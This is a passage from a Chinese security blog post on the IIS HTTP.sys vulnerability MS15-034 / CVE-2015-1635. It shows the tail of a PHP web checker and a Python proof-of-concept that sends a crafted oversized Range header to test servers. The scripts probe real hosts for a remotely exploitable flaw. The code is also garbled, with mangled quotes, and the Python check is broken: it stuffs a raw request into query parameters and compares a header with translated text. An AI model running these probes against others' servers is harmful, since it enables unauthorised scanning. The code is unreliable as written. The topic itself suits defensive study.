if( strpos( $response, ';403 Forbidden'; ) !== false &amp;&amp; strpos( $response, ';cloudflare-nginx'; ) !== false )
{
$status = VulnStatus::NOT_VULN_CF;
}
else
{
$status = VulnStatus::NOT_VULN;
}
}
else
{
$status = VulnStatus::NOT_VULN_MS;
}
}

unset( $fp, $header, $response );

$memcached-&gt;set( $cachekey, $status, $cachetime );
}

$status = VulnStatus::AsString( $status, $host );
}
?&gt;
&lt;!DOCTYPE HTML&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta charset="utf-8"&gt;
&lt;meta name="theme-color" content="#424242"&gt;
&lt;meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"&gt;
&lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;

&lt;title&gt;MS15-034 测试&lt;/title&gt;

&lt;link href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css" rel="stylesheet"&gt;

&lt;style type="text/css"&gt;
.container {
max-width: 900px;
}

.masthead {
position: relative;
padding: 20px 0;
text-align: center;
color: #fff;
background-color: #424242;
margin-bottom: 20px;
}

.masthead a {
color: #fff;
}

.footer {
text-align: center;
padding: 15px;
color: #555;
}

.footer span {
color: #FA5994;
}

.form-inline {
text-align: center;
margin-bottom: 20px;
}

.github {
position: absolute;
top: 0;
right: 0;
}
&lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div&gt;
&lt;div&gt;
&lt;h1&gt;HTTP.sys 堆栈漏洞测试&lt;/h1&gt;
&lt;h3&gt;输入一个URL或主机名来测试服务器的 &lt;a href="https://technet.microsoft.com/en-us/library/security/ms15-034.aspx" target="_blank"&gt;MS15-034&lt;/a&gt; / &lt;a href="http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1635" target="_blank"&gt;CVE-2015-1635&lt;/a&gt;.&lt;/h3&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;div&gt;
&lt;blockquote&gt;
&lt;p&gt;在HTTP协议栈（HTTP.sys）造成当HTTP协议堆栈不正确地分析特制的HTTP请求的远程代码执行漏洞。成功利用此漏洞谁的攻击者可以在系统帐户的上下文中执行任意代码。&lt;/p&gt;
&lt;p&gt;要利用此漏洞，攻击者必须发送一个特制的HTTP请求发送到受影响的系统。此更新通过修改Windows HTTP协议栈处理请求解决该漏洞。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;form id="js-form" method="GET"&gt;
&lt;div&gt;
&lt;input type="text" class="form-control input-lg" id="js-input" placeholder="baidu.com" name="host" autofocus&lt;?php if( $host !== false ) { echo '; value="'; . $host . ';"';; } ?&gt;&gt;
&lt;button type="submit" class="btn btn-primary btn-lg"&gt;检测&lt;/button&gt;
&lt;/div&gt;
&lt;/form&gt;

&lt;?php if( $status !== false ) { echo $status; } ?&gt;

&lt;div&gt;使用Memcached分布式内存对象缓存系统 | 所有的结果查询会被缓存五分钟&lt;/div&gt;
&lt;/div&gt;
&lt;/body&gt;
&lt;/html&gt;</pre><p><strong>漏洞验证POC</strong></p><p><strong>python版</strong></p><pre class="lang:python decode:true">#!/usr/bin/env python
__author__ = ';jastra';
class bg_colors:
    VULN = ';33[92m';
    NONVULN= ';33[95m';
    EXPLOIT = ';33[91m';  
try:
    import requests
    import re
except ImportError as ierr:
    print(bg_colors.EXPLOIT + "Error, looks like you don';t have %s installed", ierr)
    
def identify_iis(domain):
    req = requests.get(str(domain))
    remote_server = req.headers[';server';]
        
    if "Microsoft-IIS" in remote_server:
        print(bg_colors.VULN + "[+] 服务是 " + remote_server) 
        ms15_034_test(str(domain))
    else:
        print(bg_colors.NONVULN + "[-] 不是IIS\n可能是: " + remote_server) 
        
def ms15_034_test(domain):
    print(" 启动vuln检查！")
    vuln_buffer = "GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=0-18446744073709551615\r\n\r\n";
    req = requests.get(str(domain), params=vuln_buffer)
    if req.headers[';content';] == "老D提示：请求范围不符合":
        print(bg_colors.EXPLOIT + "[+] 存在漏洞")
    else:
        print(bg_colors.EXPLOIT + "[-] IIS服务无法显示漏洞是否存在. "+
               "需要手动检测")
usr_domain = raw_input("输入域名扫描: ")
identify_iis(usr_domain)</pre><p>&nbsp;</p><div class="entry-copyright"><p>原创文章，作者：老D，如若转载，请注明出处：https://laod.cn/code-audit/iis-http-sys-cve-2015-1635-ms15-034.html</p></div></div><div class="entry-tag"><a href="https://laod.cn/tag/2015-1635" rel="tag">2015-1635</a><a href="https://laod.cn/tag/http-sys" rel="tag">HTTP.SYS</a><a href="https://laod.cn/tag/iis%e6%bc%8f%e6%b4%9e" rel="tag">IIS漏洞</a><a href="https://laod.cn/tag/ms15-034" rel="tag">MS15-034</a></div><div class="entry-action"><div class="btn-zan" data-id="511"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-thumb-up-fill"></use></svg></i> 赞 <span class="entry-action-num">(0)</span></div></div><div class="entry-bar"><div class="entry-bar-inner clearfix"><div class="info text-center"><div class="info-item meta"> <a class="meta-item j-heart" href="javascript:;" data-id="511"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-star"></use></svg></i> <span class="data">0</span></a> <a class="meta-item" href="#comments"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-comment"></use></svg></i> <span class="data">0</span></a></div><div class="info-item share"> <a class="meta-item mobile j-mobile-share" href="javascript:;" data-id="511" data-qrcode="https://laod.cn/code-audit/iis-http-sys-cve-2015-1635-ms15-034.html"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-share"></use></svg></i> 生成海报</a> <a class="meta-item wechat" data-share="wechat" target="_blank" rel="nofollow" href="#"> <i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-wechat"></use></svg></i> </a> <a class="meta-item weibo" data-share="weibo" target="_blank" rel="nofollow" href="#"> <i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-weibo"></use></svg></i> </a> <a class="meta-item qq" data-share="qq" target="_blank" rel="nofollow" href="#"> <i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-qq"></use></svg></i> </a> <a class="meta-item qzone" data-share="qzone" target="_blank" rel="nofollow" href="#"> <i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-qzone"></use></svg></i> </a></div><div class="info-item act"> <a href="javascript:;" id="j-reading"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-article"></use></svg></i></a></div></div></div></div></div><div class="entry-page"><div class="entry-page-prev entry-page-nobg" style="background-image: url();"> <a href="https://laod.cn/security/wordpress-wp-super-cache.html" title="WordPress缓存插件WP-Super-Cache曝高危安全漏洞" rel="prev"> <span>WordPress缓存插件WP-Super-Cache曝高危安全漏洞</span> </a><div class="entry-page-info"> <span class="pull-left"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-arrow-left-double"></use></svg></i> 上一篇</span> <span class="pull-right">2015-04-11 04:56</span></div></div><div class="entry-page-next entry-page-nobg" style="background-image: url();"> <a href="https://laod.cn/life/value.html" title="「价值」我不是买不起，而是把钱花在了更有意义的地方【转】" rel="next"> <span>「价值」我不是买不起，而是把钱花在了更有意义的地方【转】</span> </a><div class="entry-page-info"> <span class="pull-right">下一篇 <i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-arrow-right-double"></use></svg></i></span> <span class="pull-left">2015-04-19 12:39</span></div></div></div><div class="entry-related-posts"><h3 class="entry-related-title">相关推荐</h3><ul class="entry-related cols-3 post-loop post-loop-default"><li class="item item-no-thumb"><div class="item-content"><h4 class="item-title"> <a href="https://laod.cn/code-audit/apache-301.html" target="_blank" rel="bookmark"> Apache 301转向技巧 </a></h4><div class="item-excerpt"><p>建立.htaccess文件 //可在windows cmd下或是通过文本编辑器完成301重定向代码如下：[cc lang=&#8221;php&#8221;]rewriteEngi&#8230;</p></div><div class="item-meta"> <a class="item-meta-li" href="https://laod.cn/code-audit" target="_blank">代码审计</a> <span class="item-meta-li date">2015-11-29</span><div class="item-meta-right"> <span class="item-meta-li views" title="阅读数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-eye"></use></svg></i>1.3K</span><span class="item-meta-li likes" title="点赞数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-thumb-up"></use></svg></i>0</span><a class="item-meta-li comments" href="https://laod.cn/code-audit/apache-301.html#comments" target="_blank" title="评论数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-comment"></use></svg></i>0</a><span class="item-meta-li stars" title="收藏数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-star"></use></svg></i>0</span></div></div></div></li><li class="item"><div class="item-img"> <a class="item-img-inner" href="https://laod.cn/code-audit/wordpress-lnmp-scandir.html" title="WordPress“噢,没有这个文件。请重新检查文件名,然后再试。”" target="_blank" rel="bookmark"> <img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20480%20300'%3E%3C/svg%3E" width="480" height="300" alt="WordPress“噢,没有这个文件。请重新检查文件名,然后再试。”" data-lazy-src="https://laod.cn/wp-content/uploads/2017/05/shortcodes-480x300.jpg"><noscript><img src="https://laod.cn/wp-content/uploads/2017/05/shortcodes-480x300.jpg" width="480" height="300" alt="WordPress“噢,没有这个文件。请重新检查文件名,然后再试。”"></noscript> </a> <a class="item-category" href="https://laod.cn/code-audit" target="_blank">代码审计</a></div><div class="item-content"><h4 class="item-title"> <a href="https://laod.cn/code-audit/wordpress-lnmp-scandir.html" target="_blank" rel="bookmark"> WordPress“噢,没有这个文件。请重新检查文件名,然后再试。” </a></h4><div class="item-excerpt"><p>lnmp安装了Wordpress环境，因为以前也一直在用lnmp。安装成功后，恢复网站数据、数据库，一切都很顺利，网站也正常打开了；偶然在wp后台，编辑主题时，却出现错误：“噢,没&#8230;</p></div><div class="item-meta"> <span class="item-meta-li date">2017-05-06</span><div class="item-meta-right"> <span class="item-meta-li views" title="阅读数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-eye"></use></svg></i>2.5K</span><span class="item-meta-li likes" title="点赞数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-thumb-up"></use></svg></i>0</span><a class="item-meta-li comments" href="https://laod.cn/code-audit/wordpress-lnmp-scandir.html#comments" target="_blank" title="评论数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-comment"></use></svg></i>1</a><span class="item-meta-li stars" title="收藏数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-star"></use></svg></i>0</span></div></div></div></li><li class="item item-no-thumb"><div class="item-content"><h4 class="item-title"> <a href="https://laod.cn/code-audit/pppd-arm-linux-3-10.html" target="_blank" rel="bookmark"> pppd arm linux 3.10 无法运行 </a></h4><div class="item-excerpt"><p>1、编译ppp-2.4.7.tar.gz，针对嵌入式linux平台； 2、按照网上的方法无非是如下： 1) 把ppp的源码解开 tar zxvf ppp-2.4.5.tar.gz &#8230;</p></div><div class="item-meta"> <a class="item-meta-li" href="https://laod.cn/code-audit" target="_blank">代码审计</a> <span class="item-meta-li date">2016-09-05</span><div class="item-meta-right"> <span class="item-meta-li views" title="阅读数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-eye"></use></svg></i>1.7K</span><span class="item-meta-li likes" title="点赞数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-thumb-up"></use></svg></i>0</span><a class="item-meta-li comments" href="https://laod.cn/code-audit/pppd-arm-linux-3-10.html#comments" target="_blank" title="评论数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-comment"></use></svg></i>0</a><span class="item-meta-li stars" title="收藏数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-star"></use></svg></i>0</span></div></div></div></li><li class="item item-no-thumb"><div class="item-content"><h4 class="item-title"> <a href="https://laod.cn/code-audit/linux-public-ip-address.html" target="_blank" rel="bookmark"> Linux下获取公网IP地址 </a></h4><div class="item-excerpt"><p>在linux环境渗透时有时因权限或其他原因无法使用ifconfig命令那么就可以用下面的方法查看外网ip 1、如何在LINUX服务器下查看公网IP地址，可以使用下面的方法： cur&#8230;</p></div><div class="item-meta"> <a class="item-meta-li" href="https://laod.cn/code-audit" target="_blank">代码审计</a> <span class="item-meta-li date">2015-11-16</span><div class="item-meta-right"> <span class="item-meta-li views" title="阅读数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-eye"></use></svg></i>4.9K</span><span class="item-meta-li likes" title="点赞数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-thumb-up"></use></svg></i>0</span><a class="item-meta-li comments" href="https://laod.cn/code-audit/linux-public-ip-address.html#comments" target="_blank" title="评论数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-comment"></use></svg></i>8</a><span class="item-meta-li stars" title="收藏数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-star"></use></svg></i>0</span></div></div></div></li><li class="item item-no-thumb"><div class="item-content"><h4 class="item-title"> <a href="https://laod.cn/code-audit/jquery-is-not-a-function.html" target="_blank" rel="bookmark"> 引入jQuery但是报错 $ is not a function -修改方式 </a></h4><div class="item-excerpt"><p>有遇到引入了jQuery，但是报错$ is not a function 的情况。 我写的jQuery 是这样的： [cc lang=&#8221;php&#8221;]$(doc&#8230;</p></div><div class="item-meta"> <a class="item-meta-li" href="https://laod.cn/code-audit" target="_blank">代码审计</a> <span class="item-meta-li date">2016-06-15</span><div class="item-meta-right"> <span class="item-meta-li views" title="阅读数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-eye"></use></svg></i>7.3K</span><span class="item-meta-li likes" title="点赞数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-thumb-up"></use></svg></i>0</span><a class="item-meta-li comments" href="https://laod.cn/code-audit/jquery-is-not-a-function.html#comments" target="_blank" title="评论数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-comment"></use></svg></i>2</a><span class="item-meta-li stars" title="收藏数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-star"></use></svg></i>0</span></div></div></div></li><li class="item"><div class="item-img"> <a class="item-img-inner" href="https://laod.cn/code-audit/html5-bug-crash-firefox-chrome-safari-browsers-and-also-restart-iphone-using-this-javascript-code-dos-0day-exploit.html" title="HTML5新特性Bug：这12行代码分分钟让你浏览器崩溃iPhone重启" target="_blank" rel="bookmark"> <img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20480%20300'%3E%3C/svg%3E" width="480" height="300" alt="HTML5新特性Bug：这12行代码分分钟让你浏览器崩溃iPhone重启" data-lazy-src="https://laod.cn/wp-content/uploads/2016/02/xiasibaobaole-480x300.jpg"><noscript><img src="https://laod.cn/wp-content/uploads/2016/02/xiasibaobaole-480x300.jpg" width="480" height="300" alt="HTML5新特性Bug：这12行代码分分钟让你浏览器崩溃iPhone重启"></noscript> </a> <a class="item-category" href="https://laod.cn/code-audit" target="_blank">代码审计</a></div><div class="item-content"><h4 class="item-title"> <a href="https://laod.cn/code-audit/html5-bug-crash-firefox-chrome-safari-browsers-and-also-restart-iphone-using-this-javascript-code-dos-0day-exploit.html" target="_blank" rel="bookmark"> HTML5新特性Bug：这12行代码分分钟让你浏览器崩溃iPhone重启 </a></h4><div class="item-excerpt"><p>使用这十二行JavaScript代码能让firefox、chrome、safari等众多浏览器崩溃，甚至让iPhone重启？ 起因 今天刷推特的时候发现Cyber Security&#8230;</p></div><div class="item-meta"> <span class="item-meta-li date">2016-02-15</span><div class="item-meta-right"> <span class="item-meta-li views" title="阅读数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-eye"></use></svg></i>4.9K</span><span class="item-meta-li likes" title="点赞数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-thumb-up"></use></svg></i>0</span><a class="item-meta-li comments" href="https://laod.cn/code-audit/html5-bug-crash-firefox-chrome-safari-browsers-and-also-restart-iphone-using-this-javascript-code-dos-0day-exploit.html#comments" target="_blank" title="评论数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-comment"></use></svg></i>26</a><span class="item-meta-li stars" title="收藏数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-star"></use></svg></i>0</span></div></div></div></li><li class="item"><div class="item-img"> <a class="item-img-inner" href="https://laod.cn/code-audit/google-search-results-py-script.html" title="获取Google搜索结果的Py脚本" target="_blank" rel="bookmark"> <img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20480%20300'%3E%3C/svg%3E" width="480" height="300" alt="获取Google搜索结果的Py脚本" data-lazy-src="https://laod.cn/wp-content/uploads/2016/05/326-480x300.png"><noscript><img src="https://laod.cn/wp-content/uploads/2016/05/326-480x300.png" width="480" height="300" alt="获取Google搜索结果的Py脚本"></noscript> </a> <a class="item-category" href="https://laod.cn/code-audit" target="_blank">代码审计</a></div><div class="item-content"><h4 class="item-title"> <a href="https://laod.cn/code-audit/google-search-results-py-script.html" target="_blank" rel="bookmark"> 获取Google搜索结果的Py脚本 </a></h4><div class="item-excerpt"><p>百度在搜索上跟google还是有很大差距的，尤其是google支持很多搜索语法，非常强大。所以这里这里写了个简单的获取google搜索结果的脚本。但是google做了防爬取限制，使&#8230;</p></div><div class="item-meta"> <span class="item-meta-li date">2016-05-14</span><div class="item-meta-right"> <span class="item-meta-li views" title="阅读数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-eye"></use></svg></i>4.6K</span><span class="item-meta-li likes" title="点赞数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-thumb-up"></use></svg></i>0</span><a class="item-meta-li comments" href="https://laod.cn/code-audit/google-search-results-py-script.html#comments" target="_blank" title="评论数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-comment"></use></svg></i>96</a><span class="item-meta-li stars" title="收藏数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-star"></use></svg></i>0</span></div></div></div></li><li class="item item-no-thumb"><div class="item-content"><h4 class="item-title"> <a href="https://laod.cn/code-audit/linux-file-name.html" target="_blank" rel="bookmark"> Linux 大写文件名转小写 </a></h4><div class="item-excerpt"><p>很简单的脚本实现 [cc lang=&#8221;php&#8221;]for file in * ;do mv $file `echo $file | tr ‘A-Z’ ‘a-z&#8230;</p></div><div class="item-meta"> <a class="item-meta-li" href="https://laod.cn/code-audit" target="_blank">代码审计</a> <span class="item-meta-li date">2015-10-18</span><div class="item-meta-right"> <span class="item-meta-li views" title="阅读数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-eye"></use></svg></i>3.2K</span><span class="item-meta-li likes" title="点赞数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-thumb-up"></use></svg></i>0</span><a class="item-meta-li comments" href="https://laod.cn/code-audit/linux-file-name.html#comments" target="_blank" title="评论数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-comment"></use></svg></i>2</a><span class="item-meta-li stars" title="收藏数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-star"></use></svg></i>0</span></div></div></div></li><li class="item"><div class="item-img"> <a class="item-img-inner" href="https://laod.cn/code-audit/vps-backup-ftp-nas-script.html" title="VPS本地备份及异地备份FTP上传到NAS群晖的自动脚本" target="_blank" rel="bookmark"> <img src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20480%20300'%3E%3C/svg%3E" width="480" height="300" alt="VPS本地备份及异地备份FTP上传到NAS群晖的自动脚本" data-lazy-src="https://laod.cn/wp-content/uploads/2016/01/Backup-480x300.jpg"><noscript><img src="https://laod.cn/wp-content/uploads/2016/01/Backup-480x300.jpg" width="480" height="300" alt="VPS本地备份及异地备份FTP上传到NAS群晖的自动脚本"></noscript> </a> <a class="item-category" href="https://laod.cn/code-audit" target="_blank">代码审计</a></div><div class="item-content"><h4 class="item-title"> <a href="https://laod.cn/code-audit/vps-backup-ftp-nas-script.html" target="_blank" rel="bookmark"> VPS本地备份及异地备份FTP上传到NAS群晖的自动脚本 </a></h4><div class="item-excerpt"><p>1.群晖端操作 如果之前你的群晖已可以外部直接访问的话，那么很简单： 控制板面&gt;共享文件夹&gt;新建保存备份的文件夹，这里我命名为vpsbackup 控制板面&gt;外部访&#8230;</p></div><div class="item-meta"> <span class="item-meta-li date">2016-01-27</span><div class="item-meta-right"> <span class="item-meta-li views" title="阅读数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-eye"></use></svg></i>4.0K</span><span class="item-meta-li likes" title="点赞数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-thumb-up"></use></svg></i>0</span><a class="item-meta-li comments" href="https://laod.cn/code-audit/vps-backup-ftp-nas-script.html#comments" target="_blank" title="评论数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-comment"></use></svg></i>0</a><span class="item-meta-li stars" title="收藏数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-star"></use></svg></i>0</span></div></div></div></li><li class="item item-no-thumb"><div class="item-content"><h4 class="item-title"> <a href="https://laod.cn/code-audit/chrome-fixed.html" target="_blank" rel="bookmark"> Chrome下修复元素fixed后几率触发元素偏移1或2像素 </a></h4><div class="item-excerpt"><p>存在的问题 chrome浏览器下为元素使用position fixed之后 ，触发其他动画转换 滑块或者元素缩放 旋转，被绝对/相对/固定定位的元素有几率发生偏移1或2像素让块级元&#8230;</p></div><div class="item-meta"> <a class="item-meta-li" href="https://laod.cn/code-audit" target="_blank">代码审计</a> <span class="item-meta-li date">2017-09-17</span><div class="item-meta-right"> <span class="item-meta-li views" title="阅读数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-eye"></use></svg></i>3.4K</span><span class="item-meta-li likes" title="点赞数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-thumb-up"></use></svg></i>0</span><a class="item-meta-li comments" href="https://laod.cn/code-audit/chrome-fixed.html#comments" target="_blank" title="评论数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-comment"></use></svg></i>1</a><span class="item-meta-li stars" title="收藏数"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-star"></use></svg></i>0</span></div></div></div></li></ul></div><div id="comments" class="entry-comments"><div id="respond" class="comment-respond"><h3 id="reply-title" class="comment-reply-title">发表评论 <small><a rel="nofollow" id="cancel-comment-reply-link" href="/code-audit/iis-http-sys-cve-2015-1635-ms15-034.html#respond" style="display:none;"><i class="wpcom-icon wi"><svg aria-hidden="true"><use xlink:href="#wi-close"></use></svg></i></a></small></h3><div class="comment-form"><div class="comment-must-login">请登录后评论...</div><div class="form-submit"><div class="form-submit-text pull-left"><a href="https://laod.cn/login?modal-type=login">登录</a>后才能评论</div> <button name="submit" type="submit" id="must-submit" class="btn btn-primary btn-xs submit">提交</button></div></div></div></div></article></main><aside class="sidebar"><div id="wpcom-lastest-news-2" class="widget widget_lastest_news"><ul><li><a href="https://laod.cn/news/phicomm-houmen-yinsi.html" title="斐讯免费路由的内幕与真相：留后门劫持流量窃取用户隐私">斐讯免费路由的内幕与真相：留后门劫持流量窃取用户隐私</a></li><li><a href="https://laod.cn/news/4999-bfc-baofeng.html" title="4999元的暴风播控云 能否复制迅雷玩客云的成功？">4999元的暴风播控云 能否复制迅雷玩客云的成功？</a></li><li><a href="https://laod.cn/news/google-experiments-hands-free.html" title="手机感应支付已不够看！Google测试语音支付「Hands Free」">手机感应支付已不够看！Google测试语音支付「Hands Free」</a></li><li><a href="https://laod.cn/tools/google-chrome-v71-0-3578-80.html" title="Google Chrome v71.0.3578.80 正式版发布 附下载离线地址">Google Chrome v71.0.3578.80 正式版发布 附下载离线地址</a></li><li><a href="https://laod.cn/news/google-play-china-2.html" title="Google Play商店中国地区“闪现”可访问！疑似澳门新增服务器">Google Play商店中国地区“闪现”可访问！疑似澳门新增服务器</a></li><li><a href="https://laod.cn/news/google-input-ios.html" title="Google正为 iOS 第三方输入法，集成各种搜索功能">Google正为 iOS 第三方输入法，集成各种搜索功能</a></li></ul></div><div id="categories-4" class="widget widget_categories"><h3 class="widget-title"><span>分类</span></h3><ul><li class="cat-item cat-item-1129"><a href="https://laod.cn/dns" title="公共DNS、DNS推荐、DNS测试、DNS评测、纯净DNS、科学DNS">DNS</a></li><li class="cat-item cat-item-150"><a href="https://laod.cn/hosts" title="最新hosts,hosts下载,hosts文件,hosts修改,hosts文件在哪里">hosts</a></li><li class="cat-item cat-item-1197"><a href="https://laod.cn/ssl" title="SSL、SSL证书、HTTPS、TLS 1.3、HTTP/2等... ">SSL</a></li><li class="cat-item cat-item-6"><a href="https://laod.cn/news" title="安全界、科技界的新闻记录，各种逆天科技、火星科技、黑科技">业界资讯</a></li><li class="cat-item cat-item-99"><a href="https://laod.cn/code-audit" title="代码审计 0day漏洞 漏洞挖掘...">代码审计</a></li><li class="cat-item cat-item-1"><a href="https://laod.cn/free" title="一切精品的免费资源，空间、域名、网盘、主题、云等各种免费资源。">免费资源</a></li><li class="cat-item cat-item-3"><a href="https://laod.cn/tools" title="收集分享破解各种黑科技、火星科技、实用好用的、新奇有趣的工具软件。">工具软件</a></li><li class="cat-item cat-item-4"><a href="https://laod.cn/journal" title="心情随笔，谱写记录生活中的一些琐事。">心情琐事</a></li><li class="cat-item cat-item-9"><a href="https://laod.cn/mito" title="摄影美图，各种唯美图、创意图、壁纸">摄影|美图</a></li><li class="cat-item cat-item-1417"><a href="https://laod.cn/chajian" title="Chrome好用的插件,Chrome插件，Chrome扩展，Firefox插件，Firefox扩展">浏览器插件</a></li><li class="cat-item cat-item-33"><a href="https://laod.cn/movie" title="好看的美剧,美剧下载,2017美剧,好看的电影">电影·美剧</a></li><li class="cat-item cat-item-11"><a href="https://laod.cn/life" title="美文、唯美句子、人生、日记">直视人生</a></li><li class="cat-item cat-item-5"><a href="https://laod.cn/security" title="网络安全，信息安全，网站安全，黑客，白帽子，黑帽子">网络安全</a></li><li class="cat-item cat-item-8"><a href="https://laod.cn/page" title="网页设计，网页设置，网页代码">网页|代码</a></li><li class="cat-item cat-item-93"><a href="https://laod.cn/black-technology" title="远超越现今人类科技或知识所能及的范畴，缺乏科学根据并且违反自然原理的科学技术或者产品。">黑科技</a></li><li class="cat-item cat-item-1578"><a href="https://laod.cn/hackintosh" title="分享黑苹果完美配置清单，黑苹果驱动、软件等...">黑苹果</a></li></ul></div></aside></div></div><footer class="footer"><div class="container"><div class="clearfix"><div class="footer-col footer-col-copy"><ul class="footer-nav hidden-xs"><li id="menu-item-6954" class="menu-item menu-item-6954"><a href="https://laod.cn/disclaimer">免责声明</a></li><li id="menu-item-6955" class="menu-item menu-item-6955"><a href="https://laod.cn/about">关于本站</a></li></ul><div class="copyright"><p>Copyright © 2021 上林县月夕花朝网络科技有限公司 版权所有 <a href="http://beian.miit.gov.cn" target="_blank" rel="nofollow noopener">桂ICP备18011504号-6</a> Powered by <a href="https://www.luyouwang.net" target="_blank" rel="noopener">路由网</a></p></div></div><div class="footer-col footer-col-sns"><div class="footer-sns"></div></div></div></div></footer><div class="action action-style-0 action-color-0 action-pos-0" style="bottom:20%;"><div class="action-item j-share"> <i class="wpcom-icon wi action-item-icon"><svg aria-hidden="true"><use xlink:href="#wi-share"></use></svg></i></div><div class="action-item gotop j-top"> <i class="wpcom-icon wi action-item-icon"><svg aria-hidden="true"><use xlink:href="#wi-arrow-up-2"></use></svg></i></div></div> <script type='text/javascript' id='main-js-extra'>/* <![CDATA[ */ var _wpcom_js = {"webp":"","ajaxurl":"https:\/\/laod.cn\/wp-admin\/admin-ajax.php","theme_url":"https:\/\/laod.cn\/wp-content\/themes\/justnews","slide_speed":"5000","static_cdn":"0","is_admin":"0","lightbox":"1","post_id":"511","user_card_height":"356","poster":{"notice":"\u8bf7\u957f\u6309\u4fdd\u5b58\u56fe\u7247\uff0c\u5c06\u5185\u5bb9\u5206\u4eab\u7ed9\u66f4\u591a\u597d\u53cb","generating":"\u6b63\u5728\u751f\u6210\u6d77\u62a5\u56fe\u7247...","failed":"\u6d77\u62a5\u56fe\u7247\u751f\u6210\u5931\u8d25"},"video_height":"482","fixed_sidebar":"1","js_lang":{"page_loaded":"\u5df2\u7ecf\u5230\u5e95\u4e86","no_content":"\u6682\u65e0\u5185\u5bb9","load_failed":"\u52a0\u8f7d\u5931\u8d25\uff0c\u8bf7\u7a0d\u540e\u518d\u8bd5\uff01","login_desc":"\u60a8\u8fd8\u672a\u767b\u5f55\uff0c\u8bf7\u767b\u5f55\u540e\u518d\u8fdb\u884c\u76f8\u5173\u64cd\u4f5c\uff01","login_title":"\u8bf7\u767b\u5f55","login_btn":"\u767b\u5f55","reg_btn":"\u6ce8\u518c","copy_done":"\u590d\u5236\u6210\u529f\uff01","copy_fail":"\u6d4f\u89c8\u5668\u6682\u4e0d\u652f\u6301\u62f7\u8d1d\u529f\u80fd"},"login_url":"https:\/\/laod.cn\/login?modal-type=login","register_url":"https:\/\/laod.cn\/register?modal-type=register","captcha_label":"\u70b9\u51fb\u8fdb\u884c\u4eba\u673a\u9a8c\u8bc1","captcha_verified":"\u9a8c\u8bc1\u6210\u529f","errors":{"require":"\u4e0d\u80fd\u4e3a\u7a